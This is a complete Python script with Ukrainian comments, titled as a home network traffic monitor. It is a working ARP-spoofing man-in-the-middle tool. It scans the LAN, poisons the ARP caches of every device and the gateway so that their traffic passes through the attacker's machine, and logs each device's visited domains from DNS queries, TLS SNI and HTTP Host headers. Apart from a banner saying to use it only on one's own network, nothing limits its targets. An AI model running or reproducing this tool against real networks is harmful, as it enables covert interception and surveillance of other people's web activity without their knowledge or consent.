#!/usr/bin/env python3
"""
=============================================================================
  МЕРЕЖЕВИЙ МОНІТОР ТРАФІКУ
  Показує який пристрій та який сайт відвідує у вашій мережі
  Використовуйте ТІЛЬКИ у вашій власній мережі!
=============================================================================
"""

import sys
import subprocess
import threading
import signal
import re
import socket
import time
import struct
from collections import defaultdict

# ── Перевіряємо наявність scapy ──────────────────────────────────────────────
try:
    from scapy.all import (
        sniff, DHCP, DNS, DNSQR, ARP, TCP, UDP, IP,
        Raw, send, sendp, Ether, get_if_hwaddr, srp, conf
    )
    import warnings
    warnings.filterwarnings("ignore")  # Прибираємо WARNING від scapy
except ImportError:
    print("[!] Scapy не встановлений!")
    print("    sudo apt install python3-scapy  або  pip3 install scapy")
    sys.exit(1)

# =============================================================================
#  НАЛАШТУВАННЯ
# =============================================================================
INTERFACE   = "wlan0"          # Ваш мережевий інтерфейс (wlan0 або eth0)
NETWORK     = "192.168.1.0/24" # Ваша локальна мережа
SCAN_TIMEOUT = 3               # Секунд на ARP-сканування
SPOOF_INTERVAL = 1.5           # Секунд між ARP пакетами

# =============================================================================
#  ГЛОБАЛЬНІ СТРУКТУРИ ДАНИХ
# =============================================================================
ip_to_mac      = {}            # { "192.168.1.5": "aa:bb:cc:dd:ee:ff" }
ip_to_name     = {}            # { "192.168.1.5": "iPhone Влада" }
traffic_log    = defaultdict(set)  # { "192.168.1.5": {"youtube.com", ...} }
data_lock      = threading.Lock()

gateway_ip = None
my_ip      = None
my_mac     = None

spoofing_active = True         # Прапор для зупинки потоків

# =============================================================================
#  КРОК 0: ПІДГОТОВКА СИСТЕМИ
# =============================================================================
def enable_ip_forward():
    """Вмикає IP форвардинг — обов'язково для MITM."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True, check=True
        )
        print("[✓] IP форвардинг увімкнено")
    except Exception as e:
        print(f"[!] Не вдалося увімкнути IP форвардинг: {e}")


def disable_ip_forward():
    """Вимикає IP форвардинг після завершення."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            capture_output=True
        )
    except Exception:
        pass


def get_my_ip(interface):
    """Отримує IP-адресу нашого інтерфейсу."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", interface],
            capture_output=True, text=True
        )
        match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", result.stdout)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None


def get_gateway_ip():
    """Читає IP шлюзу з таблиці маршрутизації."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True
        )
        # Рядок вигляду: "default via 192.168.1.254 dev wlan0 ..."
        match = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", result.stdout)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None

# =============================================================================
#  КРОК 1: СКАНУВАННЯ МЕРЕЖІ
# =============================================================================
def scan_network():
    """
    ARP-скан мережі — найшвидший та найнадійніший метод.
    Повертає True якщо знайшли хоч один пристрій.
    """
    global ip_to_mac, ip_to_name

    print(f"\n[*] Сканування мережі {NETWORK} ...")
    print("[*] Зачекайте 3-5 секунд...\n")

    try:
        # Формуємо широкомовний ARP запит
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=NETWORK)
        answered, _ = srp(arp_req, iface=INTERFACE, timeout=SCAN_TIMEOUT, verbose=False)

        for sent_pkt, recv_pkt in answered:
            ip  = recv_pkt[ARP].psrc
            mac = recv_pkt[ARP].hwsrc.upper()

            with data_lock:
                ip_to_mac[ip] = mac

            # Намагаємось отримати hostname через reverse DNS
            name = resolve_hostname(ip)
            if not name:
                name = mac  # Якщо hostname невідомий — покажемо MAC

            with data_lock:
                ip_to_name[ip] = name

            print(f"  [+] {name:<28} IP: {ip:<16} MAC: {mac}")

        count = len(ip_to_mac)
        print(f"\n[✓] Знайдено {count} пристроїв\n")
        return count > 0

    except PermissionError:
        print("[!] Потрібні root-права: запускай через sudo")
        return False
    except Exception as e:
        print(f"[!] Помилка сканування: {e}")
        return False


def resolve_hostname(ip):
    """Reverse DNS запит для отримання імені пристрою."""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        # Прибираємо суфікси типу .home, .lan, .local
        hostname = re.sub(r"\.(home|lan|local|router)$", "", hostname, flags=re.IGNORECASE)
        return hostname
    except Exception:
        return None

# =============================================================================
#  КРОК 2: ARP SPOOFING
# =============================================================================
def arp_spoof_target(target_ip, target_mac, gw_ip, gw_mac, my_mac_addr):
    """
    L2 ARP spoofing через sendp+Ether — без WARNING, правильна адресація.
      - Цілі:  "шлюз — це я"  -> трафік від цілі йде через нас
      - Шлюзу: "ціль — це я"  -> трафік до цілі також йде через нас
    """
    pkt_to_target = (
        Ether(src=my_mac_addr, dst=target_mac) /
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip, hwsrc=my_mac_addr)
    )
    pkt_to_gateway = (
        Ether(src=my_mac_addr, dst=gw_mac) /
        ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=my_mac_addr)
    )

    while spoofing_active:
        try:
            sendp(pkt_to_target,  iface=INTERFACE, verbose=False)
            sendp(pkt_to_gateway, iface=INTERFACE, verbose=False)
        except Exception:
            pass
        time.sleep(SPOOF_INTERVAL)


def restore_arp(target_ip, target_mac, gw_ip, gw_mac):
    """Відновлює правильні ARP таблиці після завершення."""
    try:
        sendp(Ether(src=gw_mac, dst=target_mac) /
              ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip, hwsrc=gw_mac),
              iface=INTERFACE, count=4, verbose=False)
        sendp(Ether(src=target_mac, dst=gw_mac) /
              ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=target_mac),
              iface=INTERFACE, count=4, verbose=False)
    except Exception:
        pass


def start_spoofing_all():
    """
    Запускає ARP spoofing для кожного пристрою у мережі
    (крім самих себе та шлюзу).
    """
    global gateway_ip, my_ip, my_mac

    gw_mac = ip_to_mac.get(gateway_ip)
    if not gw_mac:
        print(f"[!] MAC шлюзу ({gateway_ip}) не знайдено — ARP spoofing вимкнено")
        print("[*] Будемо слухати тільки broadcast трафік\n")
        return []

    threads = []
    targets = []

    for ip, mac in list(ip_to_mac.items()):
        # Пропускаємо себе та шлюз
        if ip in (my_ip, gateway_ip):
            continue

        name = ip_to_name.get(ip, mac)
        print(f"  [→] Перехоплюємо трафік: {name} ({ip})")

        t = threading.Thread(
            target=arp_spoof_target,
            args=(ip, mac, gateway_ip, gw_mac, my_mac),
            daemon=True
        )
        t.start()
        threads.append(t)
        targets.append((ip, mac))
        time.sleep(0.3)

    print()
    return targets


# =============================================================================
#  КРОК 3: ПЕРЕХОПЛЕННЯ ПАКЕТІВ
# =============================================================================
def get_device_name(ip):
    """Красива назва пристрою для виводу."""
    name = ip_to_name.get(ip)
    if name:
        return name
    return ip


def log_traffic(ip, site):
    """Записує відвіданий сайт та виводить рядок тільки якщо сайт новий."""
    if not site or len(site) < 4:
        return

    # Ігноруємо трафік від шлюзу, себе та системні домени
    # Роутер дублює DNS запити бо він є DNS-сервером — нам це не потрібно
    if ip in (gateway_ip, my_ip):
        return

    # Фільтруємо системне сміття
    if any(x in site.lower() for x in ['.arpa', '.local', '.lan', '192.168', '10.0.', '172.16.']):
        return

    with data_lock:
        already_seen = site in traffic_log[ip]
        traffic_log[ip].add(site)

    # Показуємо ТІЛЬКИ нові сайти — без повторів
    if not already_seen:
        name = get_device_name(ip)
        print(f"  {name:<30} →  {site}")


def process_dns(packet):
    """Витягує DNS запити (показує які сайти шукає пристрій)."""
    if not (packet.haslayer(DNS) and packet.haslayer(DNSQR)):
        return
    if packet[DNS].opcode != 0:  # Тільки query
        return
    if not packet.haslayer(IP):
        return

    ip_src = packet[IP].src
    try:
        site = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
        log_traffic(ip_src, site)
    except Exception:
        pass


def process_tls_sni(packet):
    """
    Витягує SNI (Server Name Indication) з TLS Client Hello.
    Це дає нам HTTPS домени навіть без розшифрування.
    """
    if not (packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP)):
        return
    if packet[TCP].dport != 443:
        return

    payload = bytes(packet[Raw].load)

    # TLS Handshake (0x16), Client Hello (0x01)
    if len(payload) < 43 or payload[0] != 0x16 or payload[5] != 0x01:
        return

    try:
        # Пропускаємо фіксовані поля Client Hello до Extensions
        # Record Layer:  5 байт
        # Handshake hdr: 4 байти
        # Version:       2 байти
        # Random:       32 байти
        pos = 5 + 4 + 2 + 32

        # Session ID
        if pos >= len(payload):
            return
        session_id_len = payload[pos]
        pos += 1 + session_id_len

        # Cipher Suites
        if pos + 2 > len(payload):
            return
        cipher_len = struct.unpack("!H", payload[pos:pos+2])[0]
        pos += 2 + cipher_len

        # Compression Methods
        if pos >= len(payload):
            return
        comp_len = payload[pos]
        pos += 1 + comp_len

        # Extensions length
        if pos + 2 > len(payload):
            return
        ext_total = struct.unpack("!H", payload[pos:pos+2])[0]
        pos += 2
        end = pos + ext_total

        # Парсимо extensions в пошуках SNI (type=0x0000)
        while pos + 4 <= end:
            ext_type = struct.unpack("!H", payload[pos:pos+2])[0]
            ext_len  = struct.unpack("!H", payload[pos+2:pos+4])[0]
            pos += 4

            if ext_type == 0:  # SNI extension
                # server_name_list_length (2) + name_type (1) + name_length (2)
                if pos + 5 <= end:
                    name_len = struct.unpack("!H", payload[pos+3:pos+5])[0]
                    sni = payload[pos+5:pos+5+name_len].decode("utf-8", errors="ignore")
                    if sni and "." in sni:
                        log_traffic(packet[IP].src, sni)
                return

            pos += ext_len

    except Exception:
        pass


def process_http(packet):
    """Витягує Host з HTTP запитів (порт 80)."""
    if not (packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP)):
        return
    if packet[TCP].dport != 80:
        return

    try:
        payload = packet[Raw].load.decode("utf-8", errors="ignore")
        if not any(payload.startswith(m) for m in ("GET ", "POST ", "PUT ", "HEAD ", "PATCH ")):
            return
        for line in payload.split("\r\n"):
            if line.lower().startswith("host:"):
                host = line.split(":", 1)[1].strip().split(":")[0]
                if host and "." in host:
                    log_traffic(packet[IP].src, host)
                return
    except Exception:
        pass


def packet_handler(packet):
    """Головний обробник пакетів — розподіляє по типах."""
    process_dns(packet)
    process_tls_sni(packet)
    process_http(packet)


# =============================================================================
#  СТАТИСТИКА
# =============================================================================
def show_statistics():
    """Виводить підсумкову таблицю всіх пристроїв та сайтів."""
    print("\n")
    print("=" * 80)
    print("  📊  ПІДСУМКОВА СТАТИСТИКА")
    print("=" * 80)

    with data_lock:
        log_copy = {ip: set(sites) for ip, sites in traffic_log.items()}
        all_ips  = set(ip_to_mac.keys()) | set(log_copy.keys())

    if not all_ips:
        print("  Немає даних")
        print("=" * 80)
        return

    for ip in sorted(all_ips):
        # Не показуємо себе, шлюз та нульові адреси
        if ip in (my_ip, gateway_ip, "0.0.0.0"):
            continue

        name = get_device_name(ip)
        mac  = ip_to_mac.get(ip, "невідомо")
        sites = log_copy.get(ip, set())

        print(f"\n  {'📱'} {name}")
        print(f"     IP:  {ip}   |   MAC: {mac}")

        if sites:
            print(f"     Відвідані сайти ({len(sites)}):")
            for site in sorted(sites):
                print(f"       └─ {site}")
        else:
            print("     Трафіку не зафіксовано")

    print("\n" + "=" * 80 + "\n")


# =============================================================================
#  ГОЛОВНА ФУНКЦІЯ
# =============================================================================
def main():
    global gateway_ip, my_ip, my_mac, spoofing_active

    # ── Хендлер Ctrl+C ───────────────────────────────────────────────────────
    captured_targets = []

    def signal_handler(sig, frame):
        global spoofing_active
        print("\n\n[*] Зупиняємо моніторинг...")
        spoofing_active = False
        time.sleep(1)

        # Відновлюємо ARP таблиці
        gw_mac = ip_to_mac.get(gateway_ip, "")
        if gw_mac and captured_targets:
            print("[*] Відновлення ARP таблиць...")
            for t_ip, t_mac in captured_targets:
                restore_arp(t_ip, t_mac, gateway_ip, gw_mac)

        disable_ip_forward()
        show_statistics()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # ── Шапка ────────────────────────────────────────────────────────────────
    print()
    print("=" * 80)
    print("   🔍  МЕРЕЖЕВИЙ МОНІТОР ТРАФІКУ")
    print("   Використовуйте ТІЛЬКИ у вашій власній мережі!")
    print("=" * 80)
    print(f"   Інтерфейс : {INTERFACE}")
    print(f"   Мережа    : {NETWORK}")
    print()

    # ── Перевірка root ───────────────────────────────────────────────────────
    import os
    if os.geteuid() != 0:
        print("[!] Запускайте через sudo!")
        sys.exit(1)

    # ── КРОК 0: Системна підготовка ──────────────────────────────────────────
    print("[КРОК 0] Підготовка системи...")

    my_ip  = get_my_ip(INTERFACE)
    my_mac = get_if_hwaddr(INTERFACE)

    if not my_ip:
        print(f"[!] Не вдалося отримати IP інтерфейсу {INTERFACE}")
        print(f"    Перевірте назву інтерфейсу: ip a")
        sys.exit(1)

    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("[!] Не вдалося знайти шлюз")
        sys.exit(1)

    print(f"  Наш IP   : {my_ip}")
    print(f"  Наш MAC  : {my_mac}")
    print(f"  Шлюз     : {gateway_ip}")
    enable_ip_forward()

    # ── КРОК 1: Сканування ───────────────────────────────────────────────────
    print("\n[КРОК 1] Сканування пристроїв у мережі...")
    if not scan_network():
        print("[!] Не знайдено жодного пристрою")
        sys.exit(1)

    # Реєструємо шлюз якщо не знайдено
    if gateway_ip not in ip_to_mac:
        print(f"[!] Шлюз {gateway_ip} не відповів на ARP — споофінг може не працювати")

    # ── КРОК 2: Запуск ARP spoofing ──────────────────────────────────────────
    print("[КРОК 2] Запуск перехоплення трафіку (ARP spoofing)...")
    targets = start_spoofing_all()
    captured_targets.extend(targets)

    if not targets:
        print("[*] Запускаємо в режимі пасивного прослуховування\n")

    # ── КРОК 3: Sniffing ─────────────────────────────────────────────────────
    print("[КРОК 3] Моніторинг трафіку запущено!")
    print("─" * 80)
    print("  Відкривайте сайти на телефоні — вони з'являться нижче")
    print("  Натисніть Ctrl+C для виведення статистики та виходу")
    print("─" * 80)
    print()
    print(f"  {'Пристрій':<30}  {'Сайт'}")
    print(f"  {'─'*28:<30}  {'─'*40}")

    try:
        # Перехоплюємо DNS (53), HTTP (80), HTTPS (443)
        sniff(
            iface=INTERFACE,
            prn=packet_handler,
            filter="port 53 or port 80 or port 443",
            store=False
        )
    except PermissionError:
        print("[!] Потрібні root-права")
    except Exception as e:
        print(f"[!] Помилка: {e}")
    finally:
        spoofing_active = False
        gw_mac = ip_to_mac.get(gateway_ip, "")
        if gw_mac:
            for t_ip, t_mac in captured_targets:
                restore_arp(t_ip, t_mac, gateway_ip, gw_mac)
        disable_ip_forward()


if __name__ == "__main__":
    main()
